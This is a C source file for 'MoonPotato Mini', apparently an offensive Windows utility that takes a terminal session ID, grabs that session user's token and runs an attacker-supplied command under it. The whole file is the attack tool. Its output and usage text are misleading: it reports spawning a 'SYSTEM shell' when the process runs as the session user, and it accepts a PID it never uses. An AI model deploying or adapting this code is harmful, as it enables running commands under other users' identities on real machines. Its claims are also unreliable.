#include <windows.h>
#include <UserEnv.h>
#include <WtsApi32.h>
#include <stdio.h>
#pragma comment(lib, "UserEnv.lib")
#pragma comment(lib, "WtsApi32.lib")

int wmain(int argc, wchar_t* argv[]) {
    HANDLE hToken = NULL;
    LPVOID lpEnv = NULL;
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    DWORD sessionId;
    WCHAR sysDir[MAX_PATH];

    wprintf(L"\n  MoonPotato Mini - By %s\n\n", L"moon");

    if (argc != 3) {
        wprintf(L"Usage: %s <PID/SessionID> \"command\"\n", argv[0]);
        wprintf(L"Ex: %s 1892 \"cmd /c whoami\"\n", argv[0]);
        return 1;
    }

    sessionId = _wtol(argv[1]);
    LPWSTR cmd = argv[2];

    if (!WTSQueryUserToken(sessionId, &hToken)) {
        printf("[-] WTSQueryUserToken failed: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Got token\n");

    if (!CreateEnvironmentBlock(&lpEnv, hToken, FALSE)) {
        printf("[-] CreateEnvironmentBlock failed: %d\n", GetLastError());
        CloseHandle(hToken);
        return 1;
    }

    GetSystemDirectoryW(sysDir, MAX_PATH);

    if (!CreateProcessAsUserW(hToken, NULL, cmd, NULL, NULL, FALSE,
        CREATE_UNICODE_ENVIRONMENT | NORMAL_PRIORITY_CLASS,
        lpEnv, sysDir, &si, &pi)) {
        printf("[-] CreateProcessAsUser failed: %d\n", GetLastError());
    } else {
        printf("[+] SYSTEM shell spawned!\n");
        wprintf(L"    %s\n", cmd);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    if (lpEnv) DestroyEnvironmentBlock(lpEnv);
    CloseHandle(hToken);
    return 0;
}
